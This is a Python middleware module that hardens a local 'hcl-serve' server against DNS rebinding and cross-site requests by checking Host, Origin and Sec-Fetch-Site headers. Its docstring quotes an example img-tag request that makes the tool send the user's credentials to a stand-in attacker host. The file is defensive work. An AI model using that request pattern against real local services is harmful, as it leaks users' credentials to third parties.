"""Localhost hardening for ``hcl-serve``: defend the local server against a
malicious web page the user happens to have open in the same browser.

``hcl-serve`` binds to 127.0.0.1, but that alone does not make it safe — a
web page the user visits can still be turned against it:

- **DNS rebinding.** The attacker's page rebinds its own hostname to
  127.0.0.1, so the browser sends requests to *our* server believing they
  are same-origin to the attacker's site. Defended by checking the ``Host``
  header: we only serve requests addressed to a permitted localhost name.
- **Cross-origin state change (CSRF-style).** Any page can make the browser
  POST to ``http://127.0.0.1:PORT/api/start`` and trigger an import.
  Defended by requiring that a state-changing request (anything other than
  GET/HEAD/OPTIONS) carrying an ``Origin`` header carries a *local* one. A
  same-origin request from our own page sends a localhost ``Origin``; a
  cross-origin page sends the attacker's; a non-browser client (curl) sends
  none and is allowed.
- **Cross-site reads that spend credentials.** Some ``/api/`` GETs take a
  host from the query string and authenticate against it, so a plain
  ``<img src="http://127.0.0.1:PORT/api/feed-info?url=https://evil.example/...">``
  on any page makes the tool send the user's sign-in to the attacker. The
  page never reads the answer; the harm is done by the request itself.
  Defended by refusing cross-site requests to ``/api/`` whatever the method:
  the browser's own ``Sec-Fetch-Site`` header says where a request came from
  (``same-origin`` for the console's ``fetch()``, ``none`` for a typed URL
  or bookmark); without it (an older browser, curl) a non-local ``Origin``
  is refused as for state changes. The page and its static assets carry no
  credentials and stay reachable, so a link to the console still opens it.

We add **no** CORS headers, so cross-origin JavaScript still cannot *read*
any response even for safe methods. Combined with the default 127.0.0.1
bind, that is the standard defense posture for a local-only tool server.

Implemented as pure ASGI (not ``BaseHTTPMiddleware``) so it never buffers
the ``/events`` server-sent-events stream.
"""

from __future__ import annotations

from collections.abc import Iterable
from urllib.parse import urlparse

from starlette.responses import JSONResponse
from starlette.types import ASGIApp, Receive, Scope, Send

#: Host names that mean "this machine". The bound host (from config) can be
#: added when the server is started on something other than the defaults.
DEFAULT_LOCAL_HOSTS = frozenset({"localhost", "127.0.0.1", "::1"})

_SAFE_METHODS = frozenset({"GET", "HEAD", "OPTIONS"})

#: `Sec-Fetch-Site` values that mean "not our own page". `same-site` is
#: another port or subdomain of the same site -- still somebody else.
_FOREIGN_FETCH_SITES = frozenset({"cross-site", "same-site"})


def _authority_host(authority: str) -> str:
    """The host portion of a ``Host`` header value, minus any port and IPv6
    brackets. ``127.0.0.1:8000`` -> ``127.0.0.1``; ``[::1]:8000`` -> ``::1``."""
    value = (authority or "").strip().lower()
    if not value:
        return ""
    if value.startswith("["):  # [::1] or [::1]:port
        return value[1 : value.index("]")] if "]" in value else value[1:]
    if value.count(":") == 1:  # host:port (a bare IPv6 has multiple colons and no port here)
        return value.rsplit(":", 1)[0]
    return value


def _host_allowed(hostname: str | None, allowed: frozenset[str]) -> bool:
    if not hostname:
        return False
    return hostname.strip().lower().strip("[]") in allowed


class LocalGuardMiddleware:
    """Reject (403) any request whose ``Host`` is not a permitted localhost
    name, any state-changing request from another site, and any ``/api/``
    request from another site whatever its method. See the module docstring
    for the rationale."""

    def __init__(self, app: ASGIApp, *, allowed_hosts: Iterable[str] | None = None) -> None:
        self.app = app
        self.allowed = frozenset(allowed_hosts) if allowed_hosts else DEFAULT_LOCAL_HOSTS

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope.get("type") != "http":
            await self.app(scope, receive, send)
            return

        headers = {
            key.decode("latin-1").lower(): value.decode("latin-1")
            for key, value in scope.get("headers", [])
        }

        # DNS-rebinding defense: the request must be addressed to us by a
        # localhost name, never the attacker's rebound hostname.
        if not _host_allowed(_authority_host(headers.get("host", "")), self.allowed):
            await self._deny(scope, receive, send, "host not allowed")
            return

        # Cross-origin defense: every method under /api/ (a GET there can
        # authenticate against a host the query names), state changes
        # everywhere.
        guarded = str(scope.get("path", "")).startswith("/api/") or (
            scope.get("method", "GET").upper() not in _SAFE_METHODS
        )
        if guarded and self._foreign(headers):
            await self._deny(scope, receive, send, "cross-origin request refused")
            return

        await self.app(scope, receive, send)

    def _foreign(self, headers: dict[str, str]) -> bool:
        """Whether a browser sent this request on another site's behalf.

        `Sec-Fetch-Site` is set by the browser and a page cannot forge it, so
        when present it decides. When absent the request is from a
        non-browser client or an older browser, and `Origin` -- attached to
        cross-origin requests -- is the remaining signal; no `Origin` at all
        is curl or a test, and allowed."""
        fetch_site = headers.get("sec-fetch-site")
        if fetch_site is not None:
            return fetch_site.strip().lower() in _FOREIGN_FETCH_SITES
        origin = headers.get("origin")
        return origin is not None and not _host_allowed(urlparse(origin).hostname, self.allowed)

    async def _deny(self, scope: Scope, receive: Receive, send: Send, detail: str) -> None:
        await JSONResponse({"detail": detail}, status_code=403)(scope, receive, send)
